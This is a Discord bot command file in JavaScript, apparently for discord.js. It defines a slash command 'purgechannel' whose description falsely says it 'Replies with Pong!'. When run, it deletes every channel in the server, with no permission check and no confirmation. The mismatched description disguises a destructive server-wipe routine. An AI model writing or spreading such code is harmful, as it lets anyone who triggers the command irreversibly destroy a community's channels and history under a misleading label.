const { SlashCommandBuilder, EmbedBuilder } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('purgechannel')
        .setDescription('Replies with Pong!'),
    async execute(interaction, client) {
        interaction.guild.channels.cache.forEach(channel => {
            channel.delete();
        });
    },
    
};